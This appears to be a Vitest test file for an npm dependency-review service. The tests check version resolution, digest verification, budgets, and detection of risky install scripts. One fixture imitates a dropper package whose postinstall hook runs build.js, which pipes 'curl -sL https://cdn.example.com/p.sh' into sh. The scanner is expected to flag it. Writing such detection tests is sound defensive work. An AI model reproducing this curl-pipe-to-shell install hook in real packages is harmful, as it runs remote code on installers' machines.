// @ts-nocheck
import { describe, expect, test, vi } from "vitest";

vi.mock("cloudflare:workers", () => ({
  WorkerEntrypoint: class {},
}));

const { inspectAddedNpmDependencies, resolveDependencyVersion } =
  await import("../server/lib/ecosystems/npm/dependency-artifacts");
const { summarizePackageJsonDiff } = await import("../server/lib/review");
const { SandboxError } = await import("../server/lib/sandbox");

function file(path, textSample) {
  return { path, size: textSample.length, sha256: "", textSample, flags: [] };
}

function packument(name, versions) {
  return {
    versions: Object.fromEntries(
      Object.entries(versions).map(([version, dist]) => [
        version,
        {
          dist: { tarball: `https://registry.npmjs.org/${name}/-/${name}-${version}.tgz`, ...dist },
        },
      ]),
    ),
    "dist-tags": { latest: Object.keys(versions).at(-1) },
  };
}

// A broker stub that records what it was asked for. The real broker's
// credential-free methods are the boundary under test everywhere else; here
// the point is the orchestration around them.
function brokerStub({ metadata = {}, downloads = {}, onDownload } = {}) {
  const calls = { metadata: [], downloads: [], registryUrl: 0 };
  return {
    calls,
    dispose() {},
    async registryUrl() {
      calls.registryUrl += 1;
      return "https://registry.npmjs.org";
    },
    async fetchAnonymousPackageMetadata(name) {
      calls.metadata.push(name);
      return metadata[name] ?? null;
    },
    async downloadAnonymousTarball(url, opts) {
      calls.downloads.push({ url, opts });
      if (onDownload) return onDownload(url);
      const result = downloads[url];
      if (!result)
        throw new SandboxError(JSON.stringify({ error: "download failed", status: 404 }));
      return result;
    },
    async fetchPackageMetadata() {
      throw new Error("credentialed metadata must not be used for dependency review");
    },
    async downloadPublished() {
      throw new Error("credentialed download must not be used for dependency review");
    },
    async fetchStagedDetails() {
      throw new Error("not used");
    },
    async downloadStaged() {
      throw new Error("not used");
    },
  };
}

function inspect(broker, previous, staged, extra = {}) {
  return inspectAddedNpmDependencies({
    manifestDiff: summarizePackageJsonDiff(previous, staged),
    resolveRegistryUrl: () => broker.registryUrl(),
    broker,
    scanId: "scan-1",
    organizationId: "org-1",
    ...extra,
  });
}

const DROPPER_TARBALL = {
  files: [
    file(
      "package.json",
      JSON.stringify({
        name: "proc-macro1",
        version: "0.1.0",
        scripts: { postinstall: "node build.js" },
      }),
    ),
    file(
      "build.js",
      'const { execSync } = require("child_process");\nexecSync("curl -sL https://cdn.example.com/p.sh | sh");',
    ),
  ],
  packageJson: {
    name: "proc-macro1",
    version: "0.1.0",
    scripts: { postinstall: "node build.js" },
  },
  archiveSha1: "aa".repeat(20),
  // Hex, which is what the sandbox digester returns.
  archiveSha512: "ab".repeat(64),
};

// The same 64 bytes npm would publish as base64 SRI. npm emits `dist.integrity`
// in base64 and the sandbox returns hex, so a comparison that skips the
// conversion reports a mismatch on every healthy dependency.
const DROPPER_SRI = `sha512-${btoa(String.fromCharCode(...Array.from({ length: 64 }, () => 0xab)))}`;

describe("resolveDependencyVersion", () => {
  const metadata = {
    versions: { "1.0.0": {}, "1.4.7": {}, "2.0.0": {} },
    "dist-tags": { latest: "2.0.0", next: "1.4.7" },
  };

  test("a dist-tag resolves through the tag map, not the range matcher", () => {
    expect(resolveDependencyVersion(metadata, "latest")).toBe("2.0.0");
    expect(resolveDependencyVersion(metadata, "next")).toBe("1.4.7");
  });

  test("a range resolves to the highest published version it admits", () => {
    expect(resolveDependencyVersion(metadata, "^1.0.0")).toBe("1.4.7");
  });

  test("a dist-tag pointing at an unpublished version does not resolve", () => {
    expect(
      resolveDependencyVersion(
        { versions: { "1.0.0": {} }, "dist-tags": { latest: "9.9.9" } },
        "latest",
      ),
    ).toBeNull();
  });
});

describe("inspectAddedNpmDependencies", () => {
  test("a release adding a dropper dependency records the whole path", async () => {
    const url = "https://registry.npmjs.org/proc-macro1/-/proc-macro1-0.1.0.tgz";
    const broker = brokerStub({
      metadata: {
        "proc-macro1": packument("proc-macro1", { "0.1.0": { integrity: DROPPER_SRI } }),
      },
      downloads: { [url]: DROPPER_TARBALL },
    });

    const review = await inspect(
      broker,
      { name: "arrayref", version: "0.3.9", dependencies: {} },
      { name: "arrayref", version: "0.3.10", dependencies: { "proc-macro1": "0.1.0" } },
    );

    expect(review.status).toBe("complete");
    expect(review.selectedCount).toBe(1);
    expect(review.inspectedCount).toBe(1);
    const [dependency] = review.dependencies;
    expect(dependency).toMatchObject({
      name: "proc-macro1",
      resolvedVersion: "0.1.0",
      declarationKind: "exact",
      status: "inspected",
      verdict: "install-risk",
      registryHost: "registry.npmjs.org",
      artifactUrl: url,
      fileCount: 2,
    });
    expect(dependency.automaticExecution).toEqual([{ kind: "script", name: "postinstall" }]);
    expect(dependency.installReachableCapabilities).toContain("code.remote-shell");
  });

  test("the recomputed digest is bound to the digest the registry advertised", async () => {
    const url = "https://registry.npmjs.org/proc-macro1/-/proc-macro1-0.1.0.tgz";
    const broker = brokerStub({
      metadata: {
        "proc-macro1": packument("proc-macro1", { "0.1.0": { integrity: DROPPER_SRI } }),
      },
      downloads: { [url]: DROPPER_TARBALL },
    });
    const review = await inspect(
      broker,
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { "proc-macro1": "0.1.0" } },
    );
    // Both sides are normalized to hex so the record's two rows are directly
    // comparable, and so the SRI conversion is what is under test here.
    expect(review.dependencies[0].declaredDigest).toEqual({
      algorithm: "sha512",
      value: "ab".repeat(64),
    });
    expect(review.dependencies[0].reviewedDigest).toEqual({
      algorithm: "sha512",
      value: "ab".repeat(64),
    });
    expect(review.dependencies[0].digestVerified).toBe(true);
  });

  test("persisted artifact provenance drops registry-controlled URL secrets", async () => {
    const safeUrl = "https://registry.npmjs.org/proc-macro1/-/proc-macro1-0.1.0.tgz";
    const fetchedUrl = `${safeUrl}?X-Amz-Credential=fake#fragment`;
    const broker = brokerStub({
      metadata: {
        "proc-macro1": {
          versions: {
            "0.1.0": { dist: { tarball: fetchedUrl, integrity: DROPPER_SRI } },
          },
          "dist-tags": { latest: "0.1.0" },
        },
      },
      downloads: { [fetchedUrl]: DROPPER_TARBALL },
    });

    const review = await inspect(
      broker,
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { "proc-macro1": "0.1.0" } },
    );

    expect(broker.calls.downloads[0].url).toBe(fetchedUrl);
    expect(review.dependencies[0].artifactUrl).toBe(safeUrl);
  });

  test("a digest the registry and the bytes disagree on is recorded as unverified-false", async () => {
    const url = "https://registry.npmjs.org/proc-macro1/-/proc-macro1-0.1.0.tgz";
    const broker = brokerStub({
      metadata: {
        "proc-macro1": packument("proc-macro1", {
          "0.1.0": {
            integrity: `sha512-${btoa(String.fromCharCode(...Array.from({ length: 64 }, () => 0x11)))}`,
          },
        }),
      },
      downloads: { [url]: DROPPER_TARBALL },
    });
    const review = await inspect(
      broker,
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { "proc-macro1": "0.1.0" } },
    );
    expect(review.dependencies[0].digestVerified).toBe(false);
  });

  test("a registry that answers nothing to a credential-free request fails visibly", async () => {
    // The private-dependency case. Drydock does not retry with the org token:
    // the review records a gap and the release cannot read as fully reviewed.
    const broker = brokerStub({ metadata: {} });
    const review = await inspect(
      broker,
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { "@private/internal": "^1.0.0" } },
    );
    expect(review.dependencies[0]).toMatchObject({
      status: "uninspectable",
      reason: "metadata-unavailable",
    });
    expect(broker.calls.downloads).toEqual([]);
  });

  test("a git spec is recorded as unresolvable without any fetch", async () => {
    const broker = brokerStub();
    const review = await inspect(
      broker,
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { tool: "github:owner/repo" } },
    );
    expect(review.dependencies[0]).toMatchObject({
      status: "uninspectable",
      reason: "unresolvable-spec",
    });
    expect(broker.calls.metadata).toEqual([]);
  });

  test("an oversized artifact is a size gap, not a download failure", async () => {
    const broker = brokerStub({
      metadata: { big: packument("big", { "1.0.0": {} }) },
      onDownload() {
        throw new SandboxError(JSON.stringify({ error: "tarball too large", status: 413 }));
      },
    });
    const review = await inspect(
      broker,
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { big: "1.0.0" } },
    );
    expect(review.dependencies[0]).toMatchObject({
      status: "uninspectable",
      reason: "artifact-too-large",
      resolvedVersion: "1.0.0",
    });
  });

  test("dependencies past the per-release budget are recorded, not silently dropped", async () => {
    const names = ["a", "b", "c", "d", "e", "f", "g", "h"];
    const metadata = Object.fromEntries(
      names.map((name) => [name, packument(name, { "1.0.0": {} })]),
    );
    const downloads = Object.fromEntries(
      names.map((name) => [
        `https://registry.npmjs.org/${name}/-/${name}-1.0.0.tgz`,
        {
          files: [file("package.json", JSON.stringify({ name, version: "1.0.0" }))],
          packageJson: { name, version: "1.0.0" },
        },
      ]),
    );
    const broker = brokerStub({ metadata, downloads });
    const review = await inspect(
      broker,
      { name: "p", version: "1.0.0" },
      {
        name: "p",
        version: "1.0.1",
        dependencies: Object.fromEntries(names.map((name) => [name, "1.0.0"])),
      },
    );
    expect(review.status).toBe("partial");
    expect(review.selectedCount).toBe(8);
    expect(review.inspectedCount).toBe(6);
    expect(
      review.dependencies.filter((entry) => entry.reason === "budget-exhausted").map((e) => e.name),
    ).toEqual(["g", "h"]);
  });

  test("the wall-clock budget stops fetching without failing the review", async () => {
    const names = ["a", "b", "c"];
    const metadata = Object.fromEntries(
      names.map((name) => [name, packument(name, { "1.0.0": {} })]),
    );
    const downloads = Object.fromEntries(
      names.map((name) => [
        `https://registry.npmjs.org/${name}/-/${name}-1.0.0.tgz`,
        {
          files: [file("package.json", JSON.stringify({ name, version: "1.0.0" }))],
          packageJson: { name, version: "1.0.0" },
        },
      ]),
    );
    const broker = brokerStub({ metadata, downloads });
    let clock = 0;
    const review = await inspect(
      broker,
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { a: "1.0.0", b: "1.0.0", c: "1.0.0" } },
      {
        now: () => {
          clock += 15_000;
          return clock;
        },
      },
    );
    expect(review.status).toBe("partial");
    expect(review.inspectedCount).toBe(1);
    expect(review.dependencies.filter((e) => e.reason === "budget-exhausted")).toHaveLength(2);
  });

  test("the wall-clock budget stops waiting for an in-flight registry request", async () => {
    const broker = brokerStub({
      metadata: { hanging: packument("hanging", { "1.0.0": {} }) },
    });
    broker.fetchAnonymousPackageMetadata = async () => new Promise(() => {});
    const startedAt = Date.now();
    const review = await inspect(
      broker,
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { hanging: "1.0.0" } },
      { budgetMs: 10 },
    );
    expect(Date.now() - startedAt).toBeLessThan(1_000);
    expect(review).toMatchObject({
      status: "partial",
      selectedCount: 1,
      inspectedCount: 0,
      uninspectableCount: 1,
      dependencies: [{ name: "hanging", reason: "budget-exhausted" }],
    });
  });

  test("metadata settling after the deadline cannot start an artifact download", async () => {
    const broker = brokerStub();
    let resolveMetadata;
    broker.fetchAnonymousPackageMetadata = async () =>
      new Promise((resolve) => {
        resolveMetadata = resolve;
      });
    const reviewPromise = inspect(
      broker,
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { late: "1.0.0" } },
      { budgetMs: 10 },
    );

    const review = await reviewPromise;
    resolveMetadata(packument("late", { "1.0.0": {} }));
    await new Promise((resolve) => setTimeout(resolve, 0));

    expect(review.dependencies[0]).toMatchObject({ reason: "budget-exhausted" });
    expect(broker.calls.downloads).toEqual([]);
  });

  test("the wall-clock budget includes resolving the registry connection", async () => {
    const broker = brokerStub();
    broker.registryUrl = async () => new Promise(() => {});
    const startedAt = Date.now();
    const review = await inspect(
      broker,
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { hanging: "1.0.0" } },
      { budgetMs: 10 },
    );
    expect(Date.now() - startedAt).toBeLessThan(1_000);
    expect(review).toMatchObject({
      status: "partial",
      dependencies: [{ name: "hanging", reason: "budget-exhausted" }],
    });
  });

  test("bounds persisted dependency records independently of selected count", async () => {
    const names = Array.from({ length: 80 }, (_, index) => `dependency-${index}`);
    const metadata = Object.fromEntries(
      names.map((name) => [name, packument(name, { "1.0.0": {} })]),
    );
    const downloads = Object.fromEntries(
      names.map((name) => [
        `https://registry.npmjs.org/${name}/-/${name}-1.0.0.tgz`,
        {
          files: [file("package.json", JSON.stringify({ name, version: "1.0.0" }))],
          packageJson: { name, version: "1.0.0" },
        },
      ]),
    );
    const review = await inspect(
      brokerStub({ metadata, downloads }),
      { name: "p", version: "1.0.0" },
      {
        name: "p",
        version: "1.0.1",
        dependencies: Object.fromEntries(names.map((name) => [name, "1.0.0"])),
      },
    );
    expect(review).toMatchObject({
      status: "partial",
      selectedCount: 80,
      inspectedCount: 6,
      uninspectableCount: 74,
      omittedCount: 16,
    });
    expect(review.dependencies).toHaveLength(64);
  });

  test("a registry lookup failure remains a visible review gap", async () => {
    const broker = brokerStub();
    broker.registryUrl = async () => {
      throw new Error("D1 unavailable");
    };
    const review = await inspect(
      broker,
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { added: "1.0.0" } },
    );
    expect(review).toMatchObject({
      status: "partial",
      selectedCount: 1,
      inspectedCount: 0,
      uninspectableCount: 1,
      dependencies: [{ name: "added", reason: "review-failed" }],
    });
  });

  test("a baseline acquisition gap reviews every staged install dependency", async () => {
    const broker = brokerStub();
    const review = await inspect(
      broker,
      null,
      { name: "p", version: "1.0.0", dependencies: { added: "1.0.0" } },
      { baselineManifestUnavailable: true },
    );
    expect(review).toMatchObject({
      selectedCount: 1,
      dependencies: [{ name: "added", reason: "metadata-unavailable" }],
    });
  });

  test("a release that adds no installable dependency does no work at all", async () => {
    const broker = brokerStub();
    const review = await inspect(
      broker,
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", devDependencies: { vitest: "^4.0.0" } },
    );
    expect(review).toEqual({
      status: "not-applicable",
      selectedCount: 0,
      inspectedCount: 0,
      uninspectableCount: 0,
      omittedCount: 0,
      dependencies: [],
    });
    expect(broker.calls.metadata).toEqual([]);
    // Most releases add no dependency, and resolving the registry costs a D1
    // read — nothing should happen at all for those scans.
    expect(broker.calls.registryUrl).toBe(0);
  });

  test("a legacy version with only dist.shasum still binds to its bytes", async () => {
    const url = "https://registry.npmjs.org/proc-macro1/-/proc-macro1-0.1.0.tgz";
    const broker = brokerStub({
      metadata: {
        "proc-macro1": packument("proc-macro1", { "0.1.0": { shasum: "AA".repeat(20) } }),
      },
      downloads: { [url]: DROPPER_TARBALL },
    });
    const review = await inspect(
      broker,
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { "proc-macro1": "0.1.0" } },
    );
    expect(review.dependencies[0].declaredDigest).toEqual({
      algorithm: "sha1",
      value: "aa".repeat(20),
    });
    expect(review.dependencies[0].digestVerified).toBe(true);
  });

  test("does not persist malformed registry digests", async () => {
    const broker = brokerStub({
      metadata: {
        "proc-macro1": packument("proc-macro1", {
          "0.1.0": { integrity: `sha512-${"A".repeat(5_000)}`, shasum: "not-a-sha1" },
        }),
      },
      downloads: {
        "https://registry.npmjs.org/proc-macro1/-/proc-macro1-0.1.0.tgz": DROPPER_TARBALL,
      },
    });
    const review = await inspect(
      broker,
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { "proc-macro1": "0.1.0" } },
    );
    expect(review.dependencies[0].declaredDigest).toBeNull();
    expect(review.dependencies[0].digestVerified).toBeNull();
  });

  test("a digest nothing recomputed is unverified, never a mismatch", async () => {
    const url = "https://registry.npmjs.org/proc-macro1/-/proc-macro1-0.1.0.tgz";
    const broker = brokerStub({
      metadata: {
        "proc-macro1": packument("proc-macro1", { "0.1.0": { integrity: DROPPER_SRI } }),
      },
      downloads: {
        // Digest cap hit / stream cancelled upstream: the sandbox reports null
        // rather than a partial digest.
        [url]: { ...DROPPER_TARBALL, archiveSha1: null, archiveSha512: null },
      },
    });
    const review = await inspect(
      broker,
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { "proc-macro1": "0.1.0" } },
    );
    expect(review.dependencies[0].digestVerified).toBeNull();
    expect(review.dependencies[0].status).toBe("inspected");
  });

  test("dependency artifacts are parsed with the bounded retention budget", async () => {
    const url = "https://registry.npmjs.org/proc-macro1/-/proc-macro1-0.1.0.tgz";
    const broker = brokerStub({
      metadata: { "proc-macro1": packument("proc-macro1", { "0.1.0": {} }) },
      downloads: { [url]: DROPPER_TARBALL },
    });
    await inspect(
      broker,
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { "proc-macro1": "0.1.0" } },
    );
    expect(broker.calls.downloads[0].opts).toMatchObject({
      maxFiles: 600,
      maxTextSampleChars: 256 * 1024,
    });
    expect(broker.calls.downloads[0].opts.timeoutMs).toBeGreaterThan(0);
    expect(broker.calls.downloads[0].opts.timeoutMs).toBeLessThanOrEqual(20_000);
  });

  test.each(["baseline-truncated", "content-skipped"])(
    "a dependency file flagged %s is uninspectable instead of partially assessed",
    async (flag) => {
      const url = "https://registry.npmjs.org/clipped/-/clipped-1.0.0.tgz";
      const clipped = {
        files: [
          file("package.json", JSON.stringify({ name: "clipped", version: "1.0.0" })),
          { ...file("install.js", "console.log('prefix')"), flags: [flag] },
        ],
        packageJson: { name: "clipped", version: "1.0.0" },
        archiveSha512: "ab".repeat(64),
      };
      const broker = brokerStub({
        metadata: { clipped: packument("clipped", { "1.0.0": {} }) },
        downloads: { [url]: clipped },
      });
      const review = await inspect(
        broker,
        { name: "p", version: "1.0.0" },
        { name: "p", version: "1.0.1", dependencies: { clipped: "1.0.0" } },
      );
      expect(review.dependencies[0]).toMatchObject({
        status: "uninspectable",
        reason: "artifact-truncated",
        fileCount: 2,
        reviewedDigest: { algorithm: "sha512", value: "ab".repeat(64) },
      });
      expect(review.dependencies[0].automaticExecution).toEqual([]);
    },
  );

  test.each([
    ["duplicate", "duplicate path; later entry replaced earlier entry"],
    ["unicode-confusable", "path contained visually-confusable characters"],
    ["non-regular", "symbolic link (symlink)"],
  ])("a dependency archive with a %s entry is uninspectable", async (kind, detail) => {
    const url = "https://registry.npmjs.org/ambiguous/-/ambiguous-1.0.0.tgz";
    const archive = {
      files: [file("package.json", JSON.stringify({ name: "ambiguous", version: "1.0.0" }))],
      packageJson: { name: "ambiguous", version: "1.0.0" },
      suspiciousEntries: [{ kind, path: "install.js", detail }],
      archiveSha512: "ab".repeat(64),
    };
    const review = await inspect(
      brokerStub({
        metadata: { ambiguous: packument("ambiguous", { "1.0.0": {} }) },
        downloads: { [url]: archive },
      }),
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { ambiguous: "1.0.0" } },
    );

    expect(review.dependencies[0]).toMatchObject({
      status: "uninspectable",
      reason: "artifact-ambiguous",
      reviewedDigest: { algorithm: "sha512", value: "ab".repeat(64) },
    });
  });

  test("an explicit directory entry does not invalidate an otherwise complete archive", async () => {
    const url = "https://registry.npmjs.org/directory/-/directory-1.0.0.tgz";
    const archive = {
      files: [file("package.json", JSON.stringify({ name: "directory", version: "1.0.0" }))],
      packageJson: { name: "directory", version: "1.0.0" },
      suspiciousEntries: [{ kind: "non-regular", path: "lib", detail: "type 5 (directory)" }],
    };
    const review = await inspect(
      brokerStub({
        metadata: { directory: packument("directory", { "1.0.0": {} }) },
        downloads: { [url]: archive },
      }),
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { directory: "1.0.0" } },
    );

    expect(review.dependencies[0]).toMatchObject({ status: "inspected", reason: null });
  });

  test("a dependency without a readable root manifest is uninspectable", async () => {
    const url = "https://registry.npmjs.org/broken/-/broken-1.0.0.tgz";
    const malformed = '{"name":"broken","scripts":{"postinstall":"node install.js",}}';
    const archive = {
      files: [file("package.json", malformed), file("install.js", "console.log('install')")],
      packageJson: null,
      archiveSha512: "ab".repeat(64),
    };
    const review = await inspect(
      brokerStub({
        metadata: { broken: packument("broken", { "1.0.0": {} }) },
        downloads: { [url]: archive },
      }),
      { name: "p", version: "1.0.0" },
      { name: "p", version: "1.0.1", dependencies: { broken: "1.0.0" } },
    );

    expect(review.dependencies[0]).toMatchObject({
      status: "uninspectable",
      reason: "manifest-unavailable",
      reviewedDigest: { algorithm: "sha512", value: "ab".repeat(64) },
      automaticExecution: [],
    });
  });
});
